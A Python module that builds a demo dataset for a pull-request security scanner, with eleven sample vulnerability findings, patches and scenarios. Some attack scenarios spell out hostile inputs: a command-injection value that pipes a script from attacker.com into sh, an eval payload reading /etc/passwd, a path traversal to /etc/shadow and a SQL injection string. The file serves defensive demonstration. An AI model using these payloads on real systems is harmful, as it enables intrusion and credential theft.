from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
from app.services.risk_service import RiskService

def get_demo_dataset() -> Dict[str, Any]:
    now = datetime.now(timezone.utc)
    
    repository = {
        "owner": "guardian-demo",
        "name": "nexus-ecommerce-platform",
        "full_name": "guardian-demo/nexus-ecommerce-platform",
        "default_branch": "main",
        "github_url": "https://github.com/guardian-demo/nexus-ecommerce-platform",
    }

    pull_request = {
        "number": 42,
        "title": "feat(checkout): add instant checkout API, admin overrides, and legacy payment bridge",
        "author": "dev-alex-security-test",
        "source_branch": "feature/checkout-v2",
        "target_branch": "main",
        "additions": 482,
        "deletions": 114,
        "changed_files": 7,
        "github_url": "https://github.com/guardian-demo/nexus-ecommerce-platform/pull/42",
    }

    # 11 realistic findings across Python, JS, and dependencies
    raw_findings = [
        {
            "rule_id": "CG-SEC-006",
            "title": "Dynamic SQL Injection in Order Query Construction",
            "description": "User-supplied customer ID is formatted directly into a raw SQL query string via f-string interpolation without parameterization.",
            "pattern_label": "Confirmed pattern",
            "severity": "critical",
            "confidence": 0.95,
            "exploitability": 0.90,
            "impact": 0.95,
            "exposure": 1.00,
            "file_path": "backend/app/db/orders.py",
            "line_start": 34,
            "line_end": 37,
            "code_snippet": "query = f\"SELECT * FROM orders WHERE customer_id = '{customer_id}' AND status = 'active'\"\ncursor.execute(query)",
            "source": "custom_rule",
            "cwe": "CWE-89",
            "owasp_category": "A05:2025",
            "ai_explanation": {
                "summary": "Direct SQL injection vulnerability allows execution of arbitrary queries.",
                "impact": "An unauthenticated attacker can dump the entire orders table or modify transaction history.",
                "why_flagged": "Dynamic string interpolation detected inside database cursor execute call.",
                "recommended_fix": "Use parameterized queries with placeholder substitution.",
                "patched_code": "query = \"SELECT * FROM orders WHERE customer_id = %s AND status = 'active'\"\ncursor.execute(query, (customer_id,))",
                "attack_scenario": "Attacker submits customer_id: \"' OR '1'='1\" retrieving records belonging to all store customers.",
                "confidence": 0.96,
                "needs_human_review": True,
                "limitations": ["Verified against PostgreSQL psycopg2 dialect conventions."],
                "input_tokens": 190,
                "output_tokens": 125,
                "latency_ms": 18,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-001",
            "title": "Hardcoded Payment Gateway API Key",
            "description": "Production Stripe live secret key hardcoded into payment processing gateway module.",
            "pattern_label": "Confirmed pattern",
            "severity": "critical",
            "confidence": 0.98,
            "exploitability": 0.90,
            "impact": 0.95,
            "exposure": 0.80,
            "file_path": "backend/app/services/payment.py",
            "line_start": 18,
            "line_end": 18,
            "code_snippet": "stripe_api_key = \"[REDACTED_SECRET:API_KEY]\"",
            "source": "custom_rule",
            "cwe": "CWE-798",
            "owasp_category": "A07:2025",
            "ai_explanation": {
                "summary": "Hardcoded live payment credential exposes company merchant accounts.",
                "impact": "Malicious actors reading this commit can issue unauthorized refunds or exfiltrate customer card details.",
                "why_flagged": "Entropy and pattern match on live payment processor API token.",
                "recommended_fix": "Rotate the exposed secret key immediately in Stripe Dashboard and read from environment variables.",
                "patched_code": "import os\nstripe_api_key = os.environ.get(\"STRIPE_API_KEY\")\nif not stripe_api_key:\n    raise RuntimeError(\"STRIPE_API_KEY environment variable is not configured\")",
                "attack_scenario": "Scraper scanning public GitHub commits detects key within seconds and exhausts merchant balance.",
                "confidence": 0.99,
                "needs_human_review": True,
                "limitations": ["Requires immediate upstream credential revocation."],
                "input_tokens": 170,
                "output_tokens": 115,
                "latency_ms": 14,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-005",
            "title": "Unsafe Shell Command Execution (Command Injection)",
            "description": "Subprocess called with shell=True to run legacy receipt generation script with unsanitized filename.",
            "pattern_label": "Confirmed pattern",
            "severity": "critical",
            "confidence": 0.90,
            "exploitability": 0.85,
            "impact": 0.95,
            "exposure": 0.80,
            "file_path": "backend/app/services/receipt.py",
            "line_start": 52,
            "line_end": 52,
            "code_snippet": "subprocess.Popen(f\"generate_pdf.sh --receipt {receipt_id}\", shell=True)",
            "source": "semgrep+custom_rule",
            "cwe": "CWE-78",
            "owasp_category": "A05:2025",
            "ai_explanation": {
                "summary": "OS Command Injection allows arbitrary shell execution on the host machine.",
                "impact": "Complete server compromise; attacker can obtain reverse shell, access local metadata, and pivot internally.",
                "why_flagged": "Invocation of subprocess with shell=True receiving formatted dynamic input.",
                "recommended_fix": "Avoid invoking system shell. Pass arguments as a discrete array and set shell=False.",
                "patched_code": "import subprocess\nsubprocess.run([\"generate_pdf.sh\", \"--receipt\", receipt_id], shell=False, check=True)",
                "attack_scenario": "Attacker sends receipt_id=\"1024; curl https://attacker.com/malware.sh | sh\" executing reverse shell.",
                "confidence": 0.93,
                "needs_human_review": True,
                "limitations": ["Assumes receipt_id is passed from public API endpoint."],
                "input_tokens": 185,
                "output_tokens": 120,
                "latency_ms": 16,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-004",
            "title": "Dynamic Expression Evaluation via eval()",
            "description": "User calculation formula passed into Python eval() function without syntax restrictions.",
            "pattern_label": "Confirmed pattern",
            "severity": "critical",
            "confidence": 0.95,
            "exploitability": 0.90,
            "impact": 1.00,
            "exposure": 0.80,
            "file_path": "backend/app/utils/pricing.py",
            "line_start": 27,
            "line_end": 27,
            "code_snippet": "discount_multiplier = eval(user_discount_formula)",
            "source": "custom_rule",
            "cwe": "CWE-95",
            "owasp_category": "A05:2025",
            "ai_explanation": {
                "summary": "Arbitrary code execution via eval() evaluating user-controlled input.",
                "impact": "Attacker can execute arbitrary Python commands inside the backend process.",
                "why_flagged": "Dynamic eval() invocation on unvalidated variable user_discount_formula.",
                "recommended_fix": "Use a safe math expression parser or whitelist allowed discount formulas.",
                "patched_code": "import ast\n# For simple literals:\ndiscount_multiplier = ast.literal_eval(user_discount_formula)",
                "attack_scenario": "Attacker sends \"__import__('os').system('cat /etc/passwd')\" in discount coupon field.",
                "confidence": 0.98,
                "needs_human_review": True,
                "limitations": ["Safe arithmetic evaluation requires dedicated math parser package."],
                "input_tokens": 175,
                "output_tokens": 110,
                "latency_ms": 15,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-008",
            "title": "Path Traversal via Unvalidated File Loading",
            "description": "File path joined with unsanitized customer invoice download filename parameter.",
            "pattern_label": "Possible vulnerability",
            "severity": "high",
            "confidence": 0.85,
            "exploitability": 0.80,
            "impact": 0.85,
            "exposure": 1.00,
            "file_path": "backend/app/api/invoices.py",
            "line_start": 45,
            "line_end": 46,
            "code_snippet": "invoice_path = os.path.join(INVOICE_DIR, filename)\nwith open(invoice_path, 'rb') as f:\n    return f.read()",
            "source": "custom_rule",
            "cwe": "CWE-22",
            "owasp_category": "A01:2025",
            "ai_explanation": {
                "summary": "Arbitrary file read vulnerability via directory traversal.",
                "impact": "Exfiltration of system configuration, source code, and credentials.",
                "why_flagged": "os.path.join with untrusted filename allows ../ relative sequence escapes.",
                "recommended_fix": "Verify that os.path.realpath of the target stays strictly within INVOICE_DIR.",
                "patched_code": "import os\nsafe_path = os.path.realpath(os.path.join(INVOICE_DIR, filename))\nif not safe_path.startswith(os.path.realpath(INVOICE_DIR)):\n    raise PermissionError(\"Access denied: path traversal attempt\")\nwith open(safe_path, 'rb') as f:\n    return f.read()",
                "attack_scenario": "Attacker requests \"../../../../etc/shadow\" to read password hashes.",
                "confidence": 0.92,
                "needs_human_review": True,
                "limitations": ["Assumes Linux deployment directory conventions."],
                "input_tokens": 180,
                "output_tokens": 120,
                "latency_ms": 14,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-007",
            "title": "Missing Authorization on Administrative Reset Endpoint",
            "description": "Sensitive administrative reset handler defined without authentication middleware or role verification.",
            "pattern_label": "Needs human review",
            "severity": "high",
            "confidence": 0.80,
            "exploitability": 0.85,
            "impact": 0.85,
            "exposure": 1.00,
            "file_path": "backend/app/api/admin.py",
            "line_start": 12,
            "line_end": 15,
            "code_snippet": "@app.post(\"/api/admin/flush-cache\")\ndef flush_cache():\n    cache.clear()\n    return {\"status\": \"cleared\"}",
            "source": "custom_rule",
            "cwe": "CWE-862",
            "owasp_category": "A01:2025",
            "ai_explanation": {
                "summary": "Privileged admin route is accessible without credentials.",
                "impact": "Any anonymous web user can trigger resource exhaustion or flush caches.",
                "why_flagged": "Route path matches administrative endpoint pattern without auth Depends marker.",
                "recommended_fix": "Inject authentication dependency requiring Superuser role.",
                "patched_code": "@app.post(\"/api/admin/flush-cache\")\ndef flush_cache(current_user = Depends(get_admin_user)):\n    cache.clear()\n    return {\"status\": \"cleared\"}",
                "attack_scenario": "Attacker continuously calls /api/admin/flush-cache to degrade application latency.",
                "confidence": 0.88,
                "needs_human_review": True,
                "limitations": ["Application routing middleware should be verified for global auth wrappers."],
                "input_tokens": 165,
                "output_tokens": 110,
                "latency_ms": 13,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-015",
            "title": "TLS Certificate Verification Disabled on Upstream Webhook",
            "description": "Outgoing HTTPS webhook dispatched with verify=False, permitting Man-in-the-Middle attacks.",
            "pattern_label": "Confirmed pattern",
            "severity": "high",
            "confidence": 0.95,
            "exploitability": 0.70,
            "impact": 0.85,
            "exposure": 0.80,
            "file_path": "backend/app/services/webhook.py",
            "line_start": 29,
            "line_end": 29,
            "code_snippet": "requests.post(upstream_url, json=payload, verify=False)",
            "source": "custom_rule",
            "cwe": "CWE-295",
            "owasp_category": "A02:2025",
            "ai_explanation": {
                "summary": "SSL/TLS verification bypassed on outbound HTTP request.",
                "impact": "Attacker positioned on local network or DNS can intercept outbound payloads containing customer data.",
                "why_flagged": "verify=False flag detected in requests.post invocation.",
                "recommended_fix": "Enable default certificate validation (verify=True) or supply trusted CA bundle.",
                "patched_code": "requests.post(upstream_url, json=payload, verify=True)",
                "attack_scenario": "Malicious WiFi router intercepts webhook dispatch and captures transaction tokens.",
                "confidence": 0.96,
                "needs_human_review": True,
                "limitations": ["If internal service uses self-signed cert, install cert in system CA truststore."],
                "input_tokens": 160,
                "output_tokens": 105,
                "latency_ms": 12,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-013",
            "title": "Weak MD5 Hashing for Customer Password Storage",
            "description": "Legacy authentication handler computes password hash using deprecated MD5 digest.",
            "pattern_label": "Confirmed pattern",
            "severity": "medium",
            "confidence": 0.95,
            "exploitability": 0.65,
            "impact": 0.75,
            "exposure": 1.00,
            "file_path": "backend/app/services/auth.py",
            "line_start": 61,
            "line_end": 62,
            "code_snippet": "password_hash = hashlib.md5(password.encode()).hexdigest()",
            "source": "custom_rule",
            "cwe": "CWE-328",
            "owasp_category": "A02:2025",
            "ai_explanation": {
                "summary": "Cryptographically broken MD5 hash used for user credentials.",
                "impact": "Exposed hashes can be cracked in seconds using precomputed rainbow tables.",
                "why_flagged": "hashlib.md5 called on password variable.",
                "recommended_fix": "Migrate to modern memory-hard password hashing such as Argon2id or bcrypt.",
                "patched_code": "from passlib.hash import argon2\npassword_hash = argon2.using(rounds=4).hash(password)",
                "attack_scenario": "Attacker obtains database dump and recovers 90% of user passwords within minutes.",
                "confidence": 0.97,
                "needs_human_review": True,
                "limitations": ["Requires database schema migration to support longer hash strings."],
                "input_tokens": 170,
                "output_tokens": 115,
                "latency_ms": 14,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-009",
            "title": "Insecure CORS Policy with Wildcard and Credentials",
            "description": "FastAPI CORSMiddleware configured with allow_origins=['*'] alongside allow_credentials=True.",
            "pattern_label": "Confirmed pattern",
            "severity": "medium",
            "confidence": 0.90,
            "exploitability": 0.60,
            "impact": 0.70,
            "exposure": 1.00,
            "file_path": "backend/app/main.py",
            "line_start": 22,
            "line_end": 26,
            "code_snippet": "app.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],\n    allow_credentials=True\n)",
            "source": "custom_rule",
            "cwe": "CWE-942",
            "owasp_category": "A06:2025",
            "ai_explanation": {
                "summary": "Cross-Origin Resource Sharing wildcard permits credential access from any origin.",
                "impact": "Malicious website visited by user can make authenticated API requests and read responses.",
                "why_flagged": "allow_origins=['*'] combined with allow_credentials=True.",
                "recommended_fix": "Restrict allow_origins to explicit trusted application domain names.",
                "patched_code": "app.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"https://app.nexus-store.com\"],\n    allow_credentials=True,\n    allow_methods=[\"GET\", \"POST\", \"PUT\", \"DELETE\"]\n)",
                "attack_scenario": "Attacker hosts evil-store.com which requests /api/profile and exfiltrates session details.",
                "confidence": 0.94,
                "needs_human_review": True,
                "limitations": ["Local development environments may require localhost origins in list."],
                "input_tokens": 175,
                "output_tokens": 115,
                "latency_ms": 13,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-DEP-001",
            "title": "Missing Python Lockfile in Repository",
            "description": "Python dependencies specified in requirements.txt without poetry.lock or strict hash pinning.",
            "pattern_label": "Possible vulnerability",
            "severity": "medium",
            "confidence": 0.85,
            "exploitability": 0.60,
            "impact": 0.65,
            "exposure": 0.50,
            "file_path": "requirements.txt",
            "line_start": 1,
            "line_end": 1,
            "code_snippet": "# Missing dependency lockfile for requirements.txt",
            "source": "dependency",
            "cwe": "CWE-1104",
            "owasp_category": "A03:2025",
            "ai_explanation": {
                "summary": "Software supply chain vulnerability due to missing dependency lockfile.",
                "impact": "Downstream CI/CD builds can install compromised minor/patch versions published by hijacked package maintainers.",
                "why_flagged": "Repository contains unpinned requirements manifest without corresponding lockfile.",
                "recommended_fix": "Adopt poetry, pip-tools, or pipfile with cryptographically verified checksum hashes.",
                "patched_code": "# Use pip-compile to generate strict hashes:\n# pip-compile --generate-hashes requirements.in",
                "attack_scenario": "Typosquatted package release or compromised PyPI account publishes malicious patch installed automatically by build server.",
                "confidence": 0.88,
                "needs_human_review": True,
                "limitations": ["Ensure local and production Python versions match exact hash sets."],
                "input_tokens": 160,
                "output_tokens": 110,
                "latency_ms": 11,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        },
        {
            "rule_id": "CG-SEC-014",
            "title": "Insecure Pseudo-Random Generator for Reset Token",
            "description": "Standard random.randint used to create password reset tokens rather than cryptographic secrets.",
            "pattern_label": "Needs human review",
            "severity": "low",
            "confidence": 0.85,
            "exploitability": 0.50,
            "impact": 0.55,
            "exposure": 1.00,
            "file_path": "backend/app/services/auth.py",
            "line_start": 84,
            "line_end": 85,
            "code_snippet": "reset_token = str(random.randint(100000, 999999))",
            "source": "custom_rule",
            "cwe": "CWE-330",
            "owasp_category": "A09:2025",
            "ai_explanation": {
                "summary": "Predictable pseudo-random generator used for security token generation.",
                "impact": "Attacker observing previous outputs can predict PRNG state and deduce upcoming reset tokens.",
                "why_flagged": "random.randint called to generate value labeled reset_token.",
                "recommended_fix": "Use the Python secrets module for generating cryptographically secure random values.",
                "patched_code": "import secrets\nreset_token = f\"{secrets.randbelow(900000) + 100000}\"",
                "attack_scenario": "Attacker initiates reset for their account, computes internal seed state, then requests reset for victim account.",
                "confidence": 0.90,
                "needs_human_review": True,
                "limitations": ["Short 6-digit tokens also require strict rate limiting on verification attempts."],
                "input_tokens": 165,
                "output_tokens": 115,
                "latency_ms": 12,
                "attempt_count": 1,
                "provider_status": "demo_mode"
            }
        }
    ]

    # Calculate individual finding risk scores
    findings = []
    for f in raw_findings:
        f_copy = dict(f)
        risk = RiskService.calculate_finding_risk(
            f_copy["severity"],
            f_copy["confidence"],
            f_copy["exploitability"],
            f_copy["exposure"]
        )
        f_copy["risk_score"] = risk
        findings.append(f_copy)

    # Calculate overall score
    critical_count = sum(1 for f in findings if f["severity"] == "critical")
    high_count = sum(1 for f in findings if f["severity"] == "high")
    medium_count = sum(1 for f in findings if f["severity"] == "medium")
    low_count = sum(1 for f in findings if f["severity"] == "low")
    info_count = sum(1 for f in findings if f["severity"] == "info")

    class DummyFinding:
        def __init__(self, score, sev):
            self.risk_score = score
            self.severity = sev

    dummy_list = [DummyFinding(f["risk_score"], f["severity"]) for f in findings]
    overall_score = RiskService.calculate_overall_scan_score(dummy_list)

    scan = {
        "status": "completed",
        "overall_score": overall_score,
        "total_findings": len(findings),
        "critical_count": critical_count,
        "high_count": high_count,
        "medium_count": medium_count,
        "low_count": low_count,
        "info_count": info_count,
        "files_analyzed": 7,
        "duration_ms": 1840,
        "scanner_version": "CodeGuardian-v1.0",
        "owasp_version": "2025",
        "is_demo": 1,
        "started_at": now - timedelta(seconds=2),
        "completed_at": now,
        "error_message": None,
    }

    scan_job = {
        "status": "completed",
        "current_stage": "Scan finished successfully",
        "progress_percent": 100,
        "error_message": None,
        "created_at": now - timedelta(seconds=2),
        "updated_at": now,
    }

    timeline = [
        {
            "id": "tl-1",
            "stage": "fetching_files",
            "title": "Pull Request Metadata Ingested",
            "description": "Retrieved 7 changed files across PR #42 from guardian-demo/nexus-ecommerce-platform.",
            "timestamp": now - timedelta(seconds=2),
            "status": "completed"
        },
        {
            "id": "tl-2",
            "stage": "running_semgrep",
            "title": "Semgrep Static Analysis",
            "description": "Executed Semgrep ruleset p/default across changed files.",
            "timestamp": now - timedelta(seconds=1, milliseconds=600),
            "status": "completed"
        },
        {
            "id": "tl-3",
            "stage": "running_custom_rules",
            "title": "Custom 15-Rule Engine Analysis",
            "description": "Evaluated AST and pattern checks for SQLi, secrets, and authz gaps.",
            "timestamp": now - timedelta(seconds=1, milliseconds=200),
            "status": "completed"
        },
        {
            "id": "tl-4",
            "stage": "normalizing_findings",
            "title": "Deduplication & OWASP 2025 Mapping",
            "description": "Normalized and deduplicated findings; resolved CWEs to OWASP Top 10:2025.",
            "timestamp": now - timedelta(milliseconds=800),
            "status": "completed"
        },
        {
            "id": "tl-5",
            "stage": "generating_ai_explanations",
            "title": "Explainable AI Reasoning Generation",
            "description": "Synthesized structured explanations, threat scenarios, and patched diffs.",
            "timestamp": now - timedelta(milliseconds=300),
            "status": "completed"
        },
        {
            "id": "tl-6",
            "stage": "completed",
            "title": "Security Review Workspace Ready",
            "description": "Completed review analysis. Transparent risk score calculated at 92.4/100.",
            "timestamp": now,
            "status": "completed"
        }
    ]

    return {
        "repository": repository,
        "pull_request": pull_request,
        "scan": scan,
        "scan_job": scan_job,
        "findings": findings,
        "timeline": timeline,
    }
